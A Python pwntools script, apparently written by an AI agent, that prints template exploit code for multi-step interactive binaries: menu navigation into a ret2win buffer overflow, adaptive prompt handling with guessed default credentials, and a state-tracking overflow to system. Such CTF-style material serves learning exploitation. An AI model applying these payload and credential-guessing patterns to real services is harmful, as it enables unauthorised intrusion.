#!/usr/bin/env python3
"""
Multi-Step Interactive Exploit Demo
===================================

This demonstrates how to handle complex interactive binaries
that require multiple steps before reaching the vulnerability.
"""

from pwn import *
import time

context.log_level = 'info'

def demo_multi_step_navigation():
    """Demonstrate multi-step binary navigation"""
    
    log.info("=== Multi-Step Interactive Exploit Demo ===")
    
    # Example of how I would handle a complex binary
    log.info("Scenario: Binary requires menu navigation before vulnerability")
    
    # Simulated steps for a complex binary
    steps = [
        "Step 1: Launch binary",
        "Step 2: Navigate main menu (choose option 1)", 
        "Step 3: Navigate sub-menu (choose option 2)",
        "Step 4: Enter authentication (username/password)",
        "Step 5: Access vulnerable function",
        "Step 6: Send exploit payload",
        "Step 7: Get shell"
    ]
    
    for i, step in enumerate(steps, 1):
        log.info(f"{step}")
        time.sleep(0.3)
    
    print()
    log.info("Pwntools code structure:")
    
    code_example = '''
def exploit_complex_binary():
    p = process('./complex_binary')
    
    # Step 1: Main menu navigation
    p.recvuntil(b'Main Menu:')
    p.sendline(b'1')  # Choose admin panel
    
    # Step 2: Sub-menu navigation  
    p.recvuntil(b'Admin Panel:')
    p.sendline(b'2')  # Choose buffer management
    
    # Step 3: Authentication
    p.recvuntil(b'Username:')
    p.sendline(b'admin')
    p.recvuntil(b'Password:')
    p.sendline(b'secret123')
    
    # Step 4: Access vulnerable function
    p.recvuntil(b'Buffer Operations:')
    p.sendline(b'3')  # Choose "process data"
    
    # Step 5: Send exploit
    p.recvuntil(b'Enter data to process:')
    payload = b'A' * 264 + p32(0x08048420)  # ret2win
    p.sendline(payload)
    
    # Step 6: Get result
    p.interactive()
'''
    
    print(code_example)
    
    log.success("✅ Multi-step navigation template ready!")

def demo_adaptive_handling():
    """Show adaptive response handling"""
    
    log.info("=== Adaptive Response Handling ===")
    
    adaptive_code = '''
def adaptive_exploit():
    p = process('./unknown_binary')
    
    # Adaptive navigation - handle unknown menus
    while True:
        try:
            data = p.recvline(timeout=3)
            
            # Pattern matching for different scenarios
            if b'menu' in data.lower():
                p.sendline(b'1')  # Try first option
            elif b'username' in data.lower():
                p.sendline(b'admin')
            elif b'password' in data.lower():
                p.sendline(b'password')
            elif b'input' in data.lower() or b'enter' in data.lower():
                # Potential vulnerability point!
                payload = craft_exploit()
                p.sendline(payload)
                break
            elif b'error' in data.lower() or b'invalid' in data.lower():
                log.warning("Error detected, adjusting...")
                continue
            else:
                # Unknown prompt, try common responses
                p.sendline(b'yes')
                
        except EOFError:
            log.info("Binary terminated")
            break
        except:
            log.warning("Timeout or error, continuing...")
            break
    
    p.interactive()
'''
    
    print(adaptive_code)
    log.success("✅ Adaptive handling template ready!")

def demo_state_tracking():
    """Show state-based exploitation"""
    
    log.info("=== State-Based Exploitation ===")
    
    state_code = '''
def state_based_exploit():
    p = process('./stateful_binary')
    
    # Track current state
    state = "INITIAL"
    
    while state != "EXPLOITED":
        if state == "INITIAL":
            p.recvuntil(b'Welcome!')
            p.sendline(b'start')
            state = "AUTHENTICATED"
            
        elif state == "AUTHENTICATED":
            p.recvuntil(b'Choose service:')
            p.sendline(b'buffer_service')
            state = "SERVICE_SELECTED"
            
        elif state == "SERVICE_SELECTED":
            p.recvuntil(b'Buffer size:')
            p.sendline(b'1024')  # Large buffer
            state = "BUFFER_READY"
            
        elif state == "BUFFER_READY":
            p.recvuntil(b'Enter data:')
            # NOW we can exploit!
            payload = b'A' * 1040 + p32(system_addr)
            p.sendline(payload)
            state = "EXPLOITED"
    
    p.interactive()
'''
    
    print(state_code)
    log.success("✅ State tracking template ready!")

if __name__ == '__main__':
    print()
    print("🎯 Multi-Step Interactive Exploitation Techniques")
    print("=================================================")
    print()
    
    demo_multi_step_navigation()
    print()
    demo_adaptive_handling() 
    print()
    demo_state_tracking()
    
    print()
    log.info("🚀 Key Techniques Available:")
    print("  1. recvuntil() - Wait for specific prompts")
    print("  2. Pattern matching - Handle unknown responses")
    print("  3. State tracking - Manage complex workflows")
    print("  4. Timeout handling - Deal with hanging prompts")
    print("  5. Error recovery - Retry on failures")
    print()
    log.success("Ready to handle any multi-step binary! 🎯")

